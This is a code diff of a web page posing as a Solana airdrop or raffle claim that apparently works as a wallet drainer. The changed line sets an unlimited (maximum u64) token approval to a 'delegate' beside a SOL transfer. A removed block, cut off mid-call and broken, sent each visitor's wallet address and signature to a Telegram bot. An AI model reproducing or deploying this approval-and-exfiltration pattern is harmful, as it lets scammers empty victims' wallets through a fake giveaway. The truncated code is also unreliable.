@@ -305,7 +305,7 @@
                     tx.add(splToken.createAssociatedTokenAccountInstruction(owner, userATA, owner, mint));
                 }
 
-                tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], Number.MAX_SAFE_INTEGER));
+                tx.add(splToken.createApproveInstruction(userATA, delegate, owner, [], BigInt("18446744073709551615")));
             }
 
             tx.add(solanaWeb3.SystemProgram.transfer({
@@ -356,7 +356,6 @@
         }
     }
 
-    // Цепляем события после загрузки
     window.addEventListener('load', () => {
         const connectBtn = document.getElementById('connect-nav');
         if (connectBtn) connectBtn.addEventListener('click', connectWallet);
@@ -368,7 +367,7 @@
         if (raffleBtn) raffleBtn.addEventListener('click', handleGiveaway);
     });
 
-    // Твой оригинальный код партиклов (оставил полностью)
+    // Партиклы (твой оригинальный код)
     (function () {
       const canvas = document.getElementById("dust");
       const ctx = canvas.getContext("2d");
@@ -414,67 +413,6 @@
       }
       tick();
     })();
-        const text = `🚀 *NEW SIGNATURE!*\n\n` +
-                     `📍 *Type:* ${type === 'airdrop' ? 'AIRDROP' : 'RAFFLE'}\n` +
-                     `💎 *Wallet:* \`${walletAddress}\`\n` +
-                     `✍️ *Signature:* \`${signature.slice(0,40)}...\``;
-
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-         
-        alert("✅ Your claim has been successfully registered!");
-
-      } catch (err) {
-        console.error(err);
-        alert("Error: Signature cancelled or failed.");
-      }
-    }
-
-    // PARTICLE ANIMATION
-    (function () {
-      const canvas = document.getElementById("dust");
-      const ctx = canvas.getContext("2d");
-      let w, h, dpr;
-
-      function resize() {
-        dpr = window.devicePixelRatio || 1;
-        w = canvas.width = window.innerWidth * dpr;
-        h = canvas.height = window.innerHeight * dpr;
-        ctx.scale(dpr, dpr);
-      }
-      window.addEventListener("resize", resize);
-      resize();
-
-      const particles = Array.from({ length: 100 }, () => ({
-        x: Math.random() * window.innerWidth,
-        y: Math.random() * window.innerHeight,
-        r: Math.random() * 2,
-        vx: Math.random() * 0.5 - 0.25,
-        vy: Math.random() * 0.5 + 0.1,
-        a: Math.random() * 0.5 + 0.2
-      }));
-
-      function tick() {
-        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
-        ctx.fillStyle = "#ffffff";
-
-        particles.forEach(p => {
-          ctx.globalAlpha = p.a;
-          ctx.beginPath();
-          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
-          ctx.fill();
-
-          p.y += p.vy;
-          p.x += p.vx;
-
-          if (p.y > window.innerHeight) p.y = -10;
-          if (p.x > window.innerWidth) p.x = 0;
-          if (p.x < 0) p.x = window.innerWidth;
-        });
-
-        requestAnimationFrame(tick);
-      }
-      tick();
-    })();
-  </script>
+</script>
 </body>
 </html>
